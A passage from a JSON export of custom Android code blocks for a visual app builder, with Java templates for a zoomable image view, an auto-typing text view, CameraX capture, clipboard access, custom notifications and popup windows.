valueAnimator \u003d android.animation.ValueAnimator.ofFloat(matrixValueManager.getScaleX(), scale);\n        valueAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n            @Override\n            public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n                float value \u003d (float) animation.getAnimatedValue();\n                mCurrentMatrix.setScale(value, value, mCurrentZoomPoint.x, mCurrentZoomPoint.y);\n                postInvalidate();\n                if (value \u003d\u003d scale) {\n                    mHandler.postDelayed(new Runnable() {\n                        @Override\n                        public void run() {\n                            adjustPosition();\n                        }\n                    }, 100);\n                    isZooming \u003d false;\n                }\n            }\n        });\n        valueAnimator.setDuration(250);\n        valueAnimator.start();\n    }\n\n    @Override\n    public boolean onDoubleTapEvent(MotionEvent motionEvent) {\n        if (motionEvent.getAction() \u003d\u003d MotionEvent.ACTION_UP) {\n            if (matrixValueManager.getScaleX() \u003e 1 || matrixValueManager.getScaleX() \u003e 1) {\n                releaseZoom();\n            } else {\n                mCurrentZoomPoint.set(motionEvent.getX(), motionEvent.getY());\n                zoomAnimation(2.0F);\n            }\n            return true;\n        }\n        return false;\n    }\n\n    @Override\n    public boolean onScale(ScaleGestureDetector scaleGestureDetector) {\n        isZooming \u003d true;\n        float scale \u003d scaleGestureDetector.getCurrentSpan() / scaleGestureDetector.getPreviousSpan();\n        if (matrixValueManager.getScaleX() \u003e\u003d 1) {\n            float focusX \u003d scaleGestureDetector.getFocusX();\n            float focusY \u003d scaleGestureDetector.getFocusY();\n            mCurrentMatrix.postScale(scale, scale, focusX, focusY);\n            postInvalidate();\n            mCurrentZoomPoint.set(focusX, focusY);\n            return true;\n        }\n        return false;\n    }\n\n    @Override\n    public boolean onScaleBegin(ScaleGestureDetector scaleGestureDetector) {\n        mRect.set(scaleGestureDetector.getFocusX(), scaleGestureDetector.getFocusY());\n        return true;\n    }\n\n    @Override\n    public void onScaleEnd(ScaleGestureDetector scaleGestureDetector) {\n        mRect.set(scaleGestureDetector.getFocusX(), scaleGestureDetector.getFocusY());\n        isZooming \u003d false;\n        onActionUp();\n    }\npublic static final class MatrixValueManager {\n\n    float[] floats;\n\n    public void setMatrix(Matrix matrix){\n        floats \u003d new float[9];\n        matrix.getValues(floats);\n    }\n\n    public float getTransitionX(){\n        return floats[Matrix.MTRANS_X];\n    }\n\n    public float getTransitionY(){\n        return floats[Matrix.MTRANS_Y];\n    }\n\n    public float getScaleX(){\n        return floats[Matrix.MSCALE_X];\n    }\n\n    public float getScaleY(){\n        return floats[Matrix.MSCALE_Y];\n    }\n\n}","color":"#FF00E676","name":"library......","typeName":"","palette":"188","type":" ","spec":"library \u003d\u003e put me in more block"},{"code":"","color":"#FF00E676","name":"for activity","typeName":"","palette":"188","type":"h","spec":"for activity...."},{"code":"%1$s \u003d new ZoomableImageView(%2$s.this);\n%1$s.setScaleType(ImageView.ScaleType.FIT_XY);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT));","color":"#FF00E676","name":"create ZoomableImageView","typeName":"","palette":"188","type":" ","spec":"create %m.ZoomableImageView in %m.activity"},{"code":"","color":"#FF00E676","name":"for fragment...","typeName":"","palette":"188","type":"h","spec":"for fragment..."},{"code":"%1$s \u003d new ZoomableImageView(getActivity());\n%1$s.setScaleType(ImageView.ScaleType.FIT_XY);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT));","color":"#FF00E676","name":"Create New ZoomableImageView fragment","typeName":"","palette":"188","type":" ","spec":"create %m.ZoomableImageView in fragment"},{"code":"","color":"#FF00E676","name":"In Every Where","typeName":"","palette":"188","type":"h","spec":"In Every Where"},{"code":"%2$s.addView(%1$s);","color":"#FF00E676","name":"show in...","typeName":"","palette":"188","type":" ","spec":"show %m.ZoomableImageView in linear %m.view"},{"code":"%1$s.setImageResource(R.drawable.%2$s);","color":"#FF00E676","name":"setImageFromResource int","typeName":"","palette":"188","type":" ","spec":"%m.ZoomableImageView set image %m.resource"},{"code":"%1$s.setImageResource(getResources().getIdentifier(%2$s, \"drawable\", getPackageName()));","color":"#FF00E676","name":"setImageFromName","typeName":"","palette":"188","type":" ","spec":"%m.ZoomableImageView setImageFromNamr %s"},{"code":"%1$s.setImageBitmap(FileUtil.decodeSampleBitmapFromPath(%2$s, 1024, 1024));","color":"#FF00E676","name":"setImageFromPath","typeName":"","palette":"188","type":" ","spec":"%m.ZoomableImageView setImageFromPath %s"},{"code":"Glide.with(getApplicationContext()).load(Uri.parse(%2$s)).into(%1$s);","color":"#FF00E676","name":"setImageFromUrl","typeName":"","palette":"188","type":" ","spec":"%m.ZoomableImageView setFromUrl %s"},{"code":"","color":"#FF00796B","name":"blocks by","typeName":"","palette":"189","type":"h","spec":"blocks by arab ware channel"},{"code":"}\npublic static class AutoTypeTextView extends TextView {\n\n    public static int PRECISSION_LOW \u003d 8;\n    public static int PRECISSION_MED \u003d 9;\n    public static int PRECISSION_HIGH \u003d 11;\n    \n    private int decryptionSpeed \u003d 10;\n    private int encryptionSpeed \u003d 10;\n    private int typingSpeed \u003d100;\n    private int precision \u003d 5;\n    private String animateEncryption \u003d \"\";\n    private String animateDecryption \u003d \"\";\n    private String animateTextTyping \u003d \"\";\n    private String animateTextTypingWithMistakes \u003d \"\";\n\n    private Handler handler;\n    private int counter\u003d0;\n    private boolean misstakeFound \u003d false;\n    private boolean executed \u003d false;\n    private Random ran \u003d new Random();\n    public String misstakeValues \u003d \"qwertyuiop[]asdfghjkl;zxcvbnm,./!@#$^\u0026*()_+1234567890\";\n    private String encryptedText;\n    private int countLetter\u003d0;\n    private int cocatation\u003d0;\n\n    public AutoTypeTextView(Context context) {\n        super(context);\n    }\n\n    public AutoTypeTextView(Context context, AttributeSet attrs) {\n        super(context, attrs);\n    }\n\n    private void setupAttributes() {\n        if(animateTextTyping!\u003dnull)\n            setTextAutoTyping(animateTextTyping);\n\n        if(animateTextTypingWithMistakes!\u003dnull) {\n            if (precision \u003c 6)\n                precision \u003d 6;\n            setTextAutoTypingWithMistakes(animateTextTypingWithMistakes, precision);\n        }\n\n        if(animateDecryption!\u003dnull)\n            animateDecryption(animateDecryption);\n\n        if(animateEncryption!\u003dnull)\n            animateEncryption(animateEncryption);\n    }\n\n    public void setTextAutoTyping(final String text) {\n        if(!executed) {\n            executed \u003d true;\n            counter \u003d 0;\n            handler \u003d new Handler();\n            handler.postDelayed(new Runnable() {\n                @Override\n                public void run() {\n                    setText(text.substring(0, counter));\n                    counter++;\n                    if (text.length() \u003e\u003d counter) {\n                        postDelayed(this, getTypingSpeed());\n                    } else {\n                        executed \u003d false;\n                    }\n                }\n            }, getTypingSpeed());\n        }\n    }\n\n    public void setTextAutoTypingWithMistakes(final String text, final int precission) {\n        if(!executed) {\n            executed \u003d true;\n            counter \u003d 0;\n            handler \u003d new Handler();\n            ran \u003d new Random();\n            handler.postDelayed(new Runnable() {\n                @Override\n                public void run() {\n                    int num \u003d ran.nextInt(10) + 1;\n                    if (num \u003e precission \u0026\u0026 counter \u003e 1 \u0026\u0026 !misstakeFound) {\n                        setText(chooseTypeOfMistake(text, counter));\n                        counter--;\n                    } else {\n                        counter++;\n                        setText(text.substring(0, counter));\n                        misstakeFound \u003d false;\n                    }\n                    if (text.length() \u003e counter) {\n                        postDelayed(this, getTypingSpeed());\n                    } else {\n                        executed \u003d false;\n                    }\n                }\n            }, getTypingSpeed());\n        }\n    }\n\n    public void animateDecryption(final String text) {\n        encryptedText \u003d text;\n        ran \u003d new Random();\n        handler \u003d new Handler();\n        cocatation \u003d ran.nextInt(10);\n        counter \u003d 0;\n        countLetter \u003d 0;\n        if(!executed) {\n            executed \u003d true;\n            for(int i\u003d0; i\u003ctext.length(); i++) {\n                encryptedText \u003d replaceCharAt(encryptedText, i, misstakeValues.charAt(ran.nextInt(misstakeValues.length())));\n                setText(encryptedText);\n            }\n                handler \u003d new Handler();\n                handler.postDelayed(new Runnable() {\n                    @Override\n                    public void run() {\n                        if(counter \u003c\u003d cocatation) {\n                            encryptedText \u003d replaceCharAt(encryptedText,countLetter,misstakeValues.charAt(ran.nextInt(misstakeValues.length())));\n                            setText(encryptedText);\n                            counter++;\n                        } else {\n                            encryptedText \u003d replaceCharAt(encryptedText, countLetter, text.charAt(countLetter));\n                            setText(encryptedText);\n                            countLetter++;\n                            cocatation \u003d ran.nextInt(10);\n                            counter \u003d 0;\n                        }\n                        if(text.length() \u003e countLetter) {\n                            postDelayed(this, getDecryptionSpeed());\n                        } else {\n                            executed \u003d false;\n                        }\n                    }\n                }, getDecryptionSpeed());\n        }\n    }\n\n    public void animateEncryption(final String text) {\n        encryptedText \u003d text;\n        ran \u003d new Random();\n        handler \u003d new Handler();\n        cocatation \u003d ran.nextInt(10);\n        counter \u003d 0;\n        countLetter \u003d 0;\n        if(!executed) {\n            executed \u003d true;\n            handler \u003d new Handler();\n            handler.postDelayed(new Runnable() {\n                @Override\n                public void run() {\n                    if(counter \u003c\u003d cocatation) {\n                        encryptedText \u003d replaceCharAt(encryptedText,countLetter,misstakeValues.charAt(ran.nextInt(misstakeValues.length())));\n                        setText(encryptedText);\n                        counter++;\n                    } else {\n                        countLetter++;\n                        cocatation \u003d ran.nextInt(10);\n                        counter \u003d 0;\n                    }\n                    if(text.length() \u003e countLetter) {\n                        postDelayed(this, getDecryptionSpeed());\n                    } else {\n                        executed \u003d false;\n                    }\n                }\n            }, getDecryptionSpeed());\n        }\n    }\n\n    private String chooseTypeOfMistake(String text, int counter) {\n        int misstake \u003d ran.nextInt(3)+1;\n        String result \u003d text.substring(0,counter);\n        switch(misstake) {\n            case 1 :\n                result \u003d text.substring(0,counter-1) + randomChar();\n                break;\n            case 2 :\n                switch (ran.nextInt(2)+1) {\n                    case 1:\n                        result \u003d text.substring(0, counter - 1) + String.valueOf(text.charAt(counter)).toLowerCase();\n                        break;\n                    case 2:\n                        result \u003d text.substring(0, counter-1) + String.valueOf(text.charAt(counter)).toUpperCase();\n                        break;\n                }\n                break;\n            case 3 :\n                result \u003d text.substring(0, counter-1);\n                break;\n        }\n        misstakeFound \u003d true;\n        return result;\n    }\n\n    private char randomChar() {\n        return misstakeValues.charAt(ran.nextInt(misstakeValues.length()));\n    }\n\n    public static String replaceCharAt(String text, int pos, char c) {\n        return text.substring(0, pos) + c + text.substring(pos + 1);\n    }\n\n    public int getTypingSpeed() {\n        return typingSpeed;\n    }\n\n    public void setTypingSpeed(int typingSpeed) {\n        this.typingSpeed \u003d typingSpeed;\n    }\n\n    public int getDecryptionSpeed() {\n        return decryptionSpeed;\n    }\n\n    public void setDecryptionSpeed(int decryptionSpeed) {\n        this.decryptionSpeed \u003d decryptionSpeed;\n    }\n\n    public int getEncryptionSpeed() {\n        return encryptionSpeed;\n    }\n\n    public void setEncryptionSpeed(int encryptionSpeed) {\n        this.encryptionSpeed \u003d encryptionSpeed;\n    }\n\n    public boolean isRunning() {\n        return executed;\n    }\n}\n{","color":"#FF00796B","name":"more block...","typeName":"","palette":"189","type":" ","spec":"put me in more block ضعني في مور بلوك"},{"code":"%1$s.addView(new AutoTypeTextView(%2$s.this));\n((AutoTypeTextView)%1$s.getChildAt((int)0)).setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT));","color":"#FF00796B","name":"create .....","typeName":"","palette":"189","type":" ","spec":"%m.view (linear) create new AutoTyperTextView %m.activity |for activity"},{"code":"%1$s.addView(new AutoTypeTextView(getActivity()));\n((AutoTypeTextView)%1$s.getChildAt((int)0)).setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT));","color":"#FF00796B","name":"create ........","typeName":"","palette":"189","type":" ","spec":"%m.view (linear) create new AutoTyperTextView |for fragment"},{"code":"((AutoTypeTextView)%1$s.getChildAt((int)0)).setTypingSpeed((int) %3$s);\n((AutoTypeTextView)%1$s.getChildAt((int)0)).setTextAutoTyping(%2$s);","color":"#FF00796B","name":"start....","typeName":"","palette":"189","type":" ","spec":"%m.view (linear) start AutoTyping %s with speed %d"},{"code":"((AutoTypeTextView)%1$s.getChildAt((int)0))","color":"#FF00796B","name":"getTextView...","typeName":"TextView","palette":"189","type":"v","spec":"%m.view (linear) getTextView"},{"code":"((AutoTypeTextView)%1$s.getChildAt((int)0))","color":"#FF00796B","name":"getView....","typeName":"View","palette":"189","type":"v","spec":"%m.view (linear) getView"},{"code":"}\r\n    private void startCamera() {\n        //make sure there isn\u0027t another camera instance running before starting\n        CameraX.unbindAll();\n\n        /* start preview */\n        int aspRatioW \u003d view_finder.getWidth(); //get width of screen\n        int aspRatioH \u003d view_finder.getHeight(); //get height\n        Rational asp \u003d new Rational (aspRatioW, aspRatioH); //aspect ratio\n        Size screen \u003d new Size(aspRatioW, aspRatioH); //size of the screen\n\n        //config obj for preview/viewfinder thingy.\n        PreviewConfig pConfig \u003d new PreviewConfig.Builder().setTargetAspectRatio(asp).setTargetResolution(screen).build();\n        Preview preview \u003d new Preview(pConfig); //lets build it\n\n        preview.setOnPreviewOutputUpdateListener(\n                new Preview.OnPreviewOutputUpdateListener() {\n\t                    //to update the surface texture we have to destroy it first, then re-add it\n\t                    @Override\n\t                    public void onUpdated(Preview.PreviewOutput output){\n\t\t                        ViewGroup parent \u003d (ViewGroup) view_finder.getParent();\n\t\t                        parent.removeView(view_finder);\n\t\t                        parent.addView(view_finder, 0);\n\t\t\n\t\t                        view_finder.setSurfaceTexture(output.getSurfaceTexture());\n\t\t                        updateTransform();\n\t\t                    }\n\t                });\n\n        /* image capture */\n\n        //config obj, selected capture mode\n        ImageCaptureConfig imgCapConfig \u003d new ImageCaptureConfig.Builder().setCaptureMode(ImageCapture.CaptureMode.MIN_LATENCY)\n                .setTargetRotation(getWindowManager().getDefaultDisplay().getRotation()).build();\n        final ImageCapture imgCap \u003d new ImageCapture(imgCapConfig);\n\n        findViewById(R.id.%1$s).setOnClickListener(new View.OnClickListener() {\n\t            @Override\n\t            public void onClick(View v) {\n\t\t                File file \u003d new File(%2$s + \"/\" + System.currentTimeMillis() + \".jpg\");\n\t\t                imgCap.takePicture(file, new ImageCapture.OnImageSavedListener() {\n\t\t\t                    @Override\n\t\t\t                    public void onImageSaved(@NonNull File file) {\n\t\t\t\t                        String msg \u003d \"Photo capture succeeded: \" + file.getAbsolutePath();\n\t\t\t\t                        Toast.makeText(getBaseContext(), msg,Toast.LENGTH_LONG).show();\n\t\t\t\t                    }\n\t\t\t\n\t\t\t                    @Override\n\t\t\t                    public void onError(@NonNull ImageCapture.UseCaseError useCaseError, @NonNull String message, @Nullable Throwable cause) {\n\t\t\t\t                        String msg \u003d \"Photo capture failed: \" + message;\n\t\t\t\t                        Toast.makeText(getBaseContext(), msg,Toast.LENGTH_LONG).show();\n\t\t\t\t                        if(cause !\u003d null){\n\t\t\t\t\t                            cause.printStackTrace();\n\t\t\t\t\t                        }\n\t\t\t\t                    }\n\t\t\t                });\n\t\t            }\n\t        });\n\n        /* image analyser */\n\n        ImageAnalysisConfig imgAConfig \u003d new ImageAnalysisConfig.Builder().setImageReaderMode(ImageAnalysis.ImageReaderMode.ACQUIRE_LATEST_IMAGE).build();\n        ImageAnalysis analysis \u003d new ImageAnalysis(imgAConfig);\n\n        analysis.setAnalyzer(\n            new ImageAnalysis.Analyzer(){\n\t                @Override\n\t                public void analyze(ImageProxy image, int rotationDegrees){\n\t\t                    //y\u0027all can add code to analyse stuff here idek go wild.\n\t\t                }\n\t            });\n\n        //bind to lifecycle:\n        CameraX.bindToLifecycle((LifecycleOwner)this, analysis, imgCap, preview);\n    }\n\n    private void updateTransform(){\n        /*\n        * compensates the changes in orientation for the viewfinder, bc the rest of the layout stays in portrait mode.\n        * methinks :thonk:\n        * imgCap does this already, this class can be commented out or be used to optimise the preview\n        */\n        Matrix mx \u003d new Matrix();\n        float w \u003d view_finder.getMeasuredWidth();\n        float h \u003d view_finder.getMeasuredHeight();\n\n        float centreX \u003d w / 2f; //calc centre of the viewfinder\n        float centreY \u003d h / 2f;\n\n        int rotationDgr;\n        int rotation \u003d (int)view_finder.getRotation(); //cast to int bc switches don\u0027t like floats\n\n        switch(rotation){ //correct output to account for display rotation\n\t            case Surface.ROTATION_0:\n\t                rotationDgr \u003d 0;\n\t                break;\n\t            case Surface.ROTATION_90:\n\t                rotationDgr \u003d 90;\n\t                break;\n\t            case Surface.ROTATION_180:\n\t                rotationDgr \u003d 180;\n\t                break;\n\t            case Surface.ROTATION_270:\n\t                rotationDgr \u003d 270;\n\t                break;\n\t            default:\n\t                return;\n\t        }\n\n        mx.postRotate((float)rotationDgr, centreX, centreY);\n        view_finder.setTransform(mx); //apply transformations to textureview\n    }\r\nprivate void foo() {","color":"#FF00695C","name":"ClassVoidStartCameraX","typeName":"","palette":"190","type":"f","spec":"StartCameraX ViewOnClick %m.view SaveToPath %s "},{"code":"startCamera();","color":"#FF00695C","name":"CameraXinit","typeName":"","palette":"190","type":" ","spec":"Initialize CameraX onCreate"},{"code":"","color":"#FF00C853","name":"BY ARAB WARE CHANNEL..","typeName":"","palette":"191","type":"h","spec":"BY ARAB WARE CHANNEL"},{"code":"((android.content.ClipboardManager) getSystemService(getApplicationContext().CLIPBOARD_SERVICE)).addPrimaryClipChangedListener(new android.content.ClipboardManager.OnPrimaryClipChangedListener() {\n@Override\npublic void onPrimaryClipChanged() {\n%1$s\n} });","color":"#FF00C853","name":"on clipboard text change","typeName":"","palette":"191","type":"c","spec":"On Clipboard Text Change"},{"code":"String.valueOf(((android.content.ClipboardManager) getSystemService(getApplicationContext().CLIPBOARD_SERVICE)).getText())","color":"#FF00C853","name":"getClipboardText","typeName":"","palette":"191","type":"s","spec":"get clipboard text"},{"code":"((android.content.ClipboardManager) getSystemService(getApplicationContext().CLIPBOARD_SERVICE)).setPrimaryClip(android.content.ClipData.newPlainText(\"clipboard\", %2$s));","color":"#FF00C853","name":"setClipboardText","typeName":"","palette":"191","type":" ","spec":"set clipboard text %s"},{"code":"","color":"#FF6200EA","name":"by.....","typeName":"","palette":"154","type":"h","spec":"BY ARAB WARE CHANNEL also THANKS FOR NELEU SINGTH BECAUSE OF HIS HELP"},{"code":"","color":"#FF6200EA","name":"activity custom notification header","typeName":"","palette":"154","type":"h","spec":"IN ACTIVITY \u003d\u003d\u003e"},{"code":"%10$s \u003d new RemoteViews(%4$s.this.getPackageName(), R.layout.%2$s);\n%11$s \u003d new RemoteViews(%4$s.this.getPackageName(), R.layout.%3$s);\nandroidx.core.app.NotificationCompat.DecoratedCustomViewStyle %1$sS \u003d new androidx.core.app.NotificationCompat.DecoratedCustomViewStyle(); \nandroidx.core.app.NotificationCompat.Builder %1$s \u003d new androidx.core.app.NotificationCompat.Builder(%4$s.this).setStyle(%1$sS).setCustomContentView(%10$s).setCustomBigContentView(%11$s).setSmallIcon(R.drawable.%6$s).setOngoing(%8$s).setPriority(androidx.core.app.NotificationCompat.PRIORITY_DEFAULT).setAutoCancel(%7$s).setContentIntent(PendingIntent.getActivity(getApplicationContext(),0,new Intent(%4$s.this.getApplicationContext(),\r\n%12$s.class),0));\nif (Build.VERSION.SDK_INT \u003e\u003d Build.VERSION_CODES.O) {\n%13$s \u003d new NotificationChannel(String.valueOf(%5$s), %14$s, NotificationManager.IMPORTANCE_HIGH);\n%13$s.setDescription(%15$s);\n%9$s \u003d androidx.core.app.NotificationManagerCompat.from(%4$s.this);\n %9$s.createNotificationChannel(%13$s);\n%1$s.setChannelId(String.valueOf(%5$s));\n    }\n%9$s \u003d androidx.core.app.NotificationManagerCompat.from(%4$s.this);\n%16$s\n%9$s.notify(%5$s, %1$s.build());","color":"#FF6200EA","name":"create new notification","typeName":"","palette":"154","type":"c","spec":"%m.notification set small %m.customViews set big %m.customViews set %m.activity set id %d set small icon %m.resource    set AutoCancel %b set On Going %b %m.NotificationManager set View 1%m.RemoteView set View 2 %m.RemoteView On Click Go To %m.activity with %m.NotificationChannel with title %s and description %s"},{"code":"","color":"#FF6200EA","name":"fragment custom notification header","typeName":"","palette":"154","type":"h","spec":"IN FRAGMENT \u003d\u003d\u003e"},{"code":"%10$s \u003d new RemoteViews(getActivity().getPackageName(), R.layout.%2$s);\n%11$s \u003d new RemoteViews(getActivity().getPackageName(), R.layout.%3$s);\nandroidx.core.app.NotificationCompat.DecoratedCustomViewStyle %1$sS \u003d new androidx.core.app.NotificationCompat.DecoratedCustomViewStyle(); \nfinal androidx.core.app.NotificationCompat.Builder %1$s \u003d new androidx.core.app.NotificationCompat.Builder(getActivity()).setStyle(%1$sS).setCustomContentView(%10$s).setCustomBigContentView(%11$s).setSmallIcon(R.drawable.%6$s).setOngoing(%8$s).setPriority(androidx.core.app.NotificationCompat.PRIORITY_DEFAULT).setAutoCancel(%7$s).setContentIntent(PendingIntent.getActivity(getApplicationContext(),0,new Intent(getApplicationContext(),\r\n%12$s.class),0));\nif (Build.VERSION.SDK_INT \u003e\u003d Build.VERSION_CODES.O) {\n%13$s \u003d new NotificationChannel(String.valueOf(%5$s), %14$s, NotificationManager.IMPORTANCE_HIGH);\n%13$s.setDescription(%15$s);\n %9$s.createNotificationChannel(%13$s);\n%9$s \u003d androidx.core.app.NotificationManagerCompat.from(%4$s.this);\n%1$s.setChannelId(String.valueOf(%5$s));\n    }\n%9$s \u003d androidx.core.app.NotificationManagerCompat.from(getActivity());\n%16$s\n%9$s.notify(%5$s, %1$s.build());","color":"#FF6200EA","name":"create new notification_copy78","typeName":"","palette":"154","type":"c","spec":"%m.notification set small %m.customViews set big %m.customViews set %m.activity set id %d set small icon %m.resource    set AutoCancel %b set On Going %b %m.NotificationManager set View 1%m.RemoteView set View 2 %m.RemoteView On Click Go To %m.activity with %m.NotificationChannel \u003d\u003etitle %s description %s"},{"code":"","color":"#FF6200EA","name":"toAddEventsOrDoActions","typeName":"","palette":"154","type":"h","spec":"toAddEventsOrDoActions لاضافة احداث او فعل شيء"},{"code":"%1$s.setTextViewText(R.id.%3$s,%2$s);","color":"#FF6200EA","name":"setText......","typeName":"","palette":"154","type":" ","spec":"%m.RemoteView setText %s of TextView %s.inputOnly"},{"code":"%1$s.setImageViewResource(R.id.%2$s,R.drawable.%3$s);","color":"#FF6200EA","name":"setImage...","typeName":"","palette":"154","type":" ","spec":"%m.RemoteView setImageView %s.inputOnly Resource %m.resource"},{"code":"%1$s.setImageViewBitmap(R.id.%2$s,((android.graphics.drawable.BitmapDrawable) %3$s.getDrawable()).getBitmap());","color":"#FF6200EA","name":"setImageBitmap...","typeName":"","palette":"154","type":" ","spec":"%m.RemoteView setImageView %s.inputOnly Bitmap From %m.imageview"},{"code":"","color":"#FF6200EA","name":"by.......","typeName":"","palette":"154","type":"h","spec":"BY ARAB WARE CHANNEL also THANKS FOR NELEU SINGTH BECAUSE OF HIS HELP"},{"code":"","color":"#FF651FFF","name":"for all android versions \u003d\u003e 5","typeName":"","palette":"154","type":"h","spec":"for all android versions 5 and up لكل اصدارات الاندرويد فوق الخمسة و الخمسة"},{"code":"","color":"#FF6200EA","name":"activity custom notification header.","typeName":"","palette":"154","type":"h","spec":"IN ACTIVITY \u003d\u003d\u003e"},{"code":"%10$s \u003d new RemoteViews(%4$s.this.getPackageName(), R.layout.%2$s);\n%11$s \u003d new RemoteViews(%4$s.this.getPackageName(), R.layout.%3$s);\nandroidx.core.app.NotificationCompat.DecoratedCustomViewStyle %1$sS \u003d new androidx.core.app.NotificationCompat.DecoratedCustomViewStyle(); \nandroidx.core.app.NotificationCompat.Builder %1$s \u003d new androidx.core.app.NotificationCompat.Builder(%4$s.this).setStyle(%1$sS).setCustomContentView(%10$s).setCustomBigContentView(%11$s).setSmallIcon(R.drawable.%6$s).setOngoing(%8$s).setPriority(androidx.core.app.NotificationCompat.PRIORITY_DEFAULT).setAutoCancel(%7$s).setContentIntent(PendingIntent.getActivity(getApplicationContext(),0,new Intent(%4$s.this.getApplicationContext(),\r\n%12$s.class),0));\nif (Build.VERSION.SDK_INT \u003e\u003d Build.VERSION_CODES.O) {\n%13$s \u003d new NotificationChannel(String.valueOf(%5$s), %14$s, NotificationManager.IMPORTANCE_HIGH);\n%13$s.setDescription(%15$s);\n%9$s \u003d androidx.core.app.NotificationManagerCompat.from(%4$s.this);\n %9$s.createNotificationChannel(%13$s);\n%1$s.setChannelId(String.valueOf(%5$s));\n    }\n%9$s \u003d androidx.core.app.NotificationManagerCompat.from(%4$s.this);\n%16$s\n%9$s.notify(%5$s, %1$s.build());","color":"#FF6200EA","name":"create new notification..","typeName":"","palette":"154","type":"c","spec":"%m.notification set small %m.customViews set big %m.customViews set %m.activity set id %d set small icon %m.resource    set AutoCancel %b set On Going %b %m.NotificationManager set View 1%m.RemoteView set View 2 %m.RemoteView On Click Go To %m.activity with %m.NotificationChannel with title %s and description %s"},{"code":"","color":"#FF6200EA","name":"fragment custom notification header.","typeName":"","palette":"154","type":"h","spec":"IN FRAGMENT \u003d\u003d\u003e"},{"code":"%10$s \u003d new RemoteViews(getActivity().getPackageName(), R.layout.%2$s);\n%11$s \u003d new RemoteViews(getActivity().getPackageName(), R.layout.%3$s);\nandroidx.core.app.NotificationCompat.DecoratedCustomViewStyle %1$sS \u003d new androidx.core.app.NotificationCompat.DecoratedCustomViewStyle(); \nfinal androidx.core.app.NotificationCompat.Builder %1$s \u003d new androidx.core.app.NotificationCompat.Builder(getActivity()).setStyle(%1$sS).setCustomContentView(%10$s).setCustomBigContentView(%11$s).setSmallIcon(R.drawable.%6$s).setOngoing(%8$s).setPriority(androidx.core.app.NotificationCompat.PRIORITY_DEFAULT).setAutoCancel(%7$s).setContentIntent(PendingIntent.getActivity(getApplicationContext(),0,new Intent(getApplicationContext(),\r\n%12$s.class),0));\nif (Build.VERSION.SDK_INT \u003e\u003d Build.VERSION_CODES.O) {\n%13$s \u003d new NotificationChannel(String.valueOf(%5$s), %14$s, NotificationManager.IMPORTANCE_HIGH);\n%13$s.setDescription(%15$s);\n %9$s.createNotificationChannel(%13$s);\n%9$s \u003d androidx.core.app.NotificationManagerCompat.from(%4$s.this);\n%1$s.setChannelId(String.valueOf(%5$s));\n    }\n%9$s \u003d androidx.core.app.NotificationManagerCompat.from(getActivity());\n%16$s\n%9$s.notify(%5$s, %1$s.build());","color":"#FF6200EA","name":"create new notification_copy78.","typeName":"","palette":"154","type":"c","spec":"%m.notification set small %m.customViews set big %m.customViews set %m.activity set id %d set small icon %m.resource    set AutoCancel %b set On Going %b %m.NotificationManager set View 1%m.RemoteView set View 2 %m.RemoteView On Click Go To %m.activity with %m.NotificationChannel \u003d\u003etitle %s description %s"},{"code":"","color":"#FF6200EA","name":"toAddEventsOrDoActions.","typeName":"","palette":"154","type":"h","spec":"toAddEventsOrDoActions لاضافة احداث او فعل شيء"},{"code":"%1$s.setTextViewText(R.id.%3$s,%2$s);","color":"#FF6200EA","name":"setText..........","typeName":"","palette":"154","type":" ","spec":"%m.RemoteView setText %s of TextView %s.inputOnly"},{"code":"%1$s.setImageViewResource(R.id.%2$s,R.drawable.%3$s);","color":"#FF6200EA","name":"setImage.......","typeName":"","palette":"154","type":" ","spec":"%m.RemoteView setImageView %s.inputOnly Resource %m.resource"},{"code":"%1$s.setImageViewBitmap(R.id.%2$s,((android.graphics.drawable.BitmapDrawable) %3$s.getDrawable()).getBitmap());","color":"#FF6200EA","name":"setImageBitmap.......","typeName":"","palette":"154","type":" ","spec":"%m.RemoteView setImageView %s.inputOnly Bitmap From %m.imageview"},{"code":"","color":"#FF388E3C","name":"CREATE BY ARAB WARE CHANNEL","typeName":"","palette":"192","type":"h","spec":"created by arab ware channel"},{"code":"View %1$sV \u003d getLayoutInflater().inflate(R.layout.%2$s, null);","color":"#FF388E3C","name":"Create View","typeName":"","palette":"192","type":" ","spec":"%m.CustomPopUp set %m.customViews"},{"code":"final PopupWindow %1$s \u003d new PopupWindow(%1$sV, ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT, true);","color":"#FF388E3C","name":"Create","typeName":"","palette":"192","type":" ","spec":"%m.CustomPopUp SetUp"},{"code":"final %3$s %2$s \u003d %1$sV.findViewById(R.id.%4$s);","color":"#FF388E3C","name":"Add View ","typeName":"","palette":"192","type":" ","spec":"%m.CustomPopUp create View with ID %s.inputOnly type %m.typeview from ID %s.inputOnly"},{"code":"%1$s.setAnimationStyle(android.R.style.Animation_Dialog);\n%1$s.showAsDropDown(%2$s, 0,0);\n%1$s.setBackgroundDrawable(new BitmapDrawable());","color":"#FF388E3C","name":"ShowPopUp","typeName":"","palette":"192","type":" ","spec":"%m.CustomPopUp On %m.view clicked then show this"},{"code":"%1$s.dismiss();","color":"#FF388E3C","name":"DismissPopUp","typeName":"","palette":"192","type":" ","spec":"%m.CustomPopUp Dismiss"},{"code":"","color":"#FF388E3C","name":"fab","typeName":"","palette":"192","type":"h","spec":"show on fab ( new )"},{"code":"%1$s.setAnimationStyle(android.R.style.Animation_Dialog);\n%1$s.showAsDropDown(_fab, (int) %2$s,(int) %3$s);\n%1$s.setBackgroundDrawable(new BitmapDrawable());","color":"#FF388E3C","name":"hwjaja","typeName":"","palette":"192","type":" ","spec":"%m.CustomPopUp set X %d set Y %d"},{"code":"","color":"#FF00BCD4","name":"created by arab ware channel !!!!!!!!!","typeName":"","palette":"193","type":"h","spec":"created by arab ware channel"},{"code":"","color":"#FF00BCD4","name":"activity custom dialog header","typeName":"","palette":"193","type":"h","spec":"IN ACTIVITY \u003d\u003d\u003e"},{"code":"%1$s \u003d new 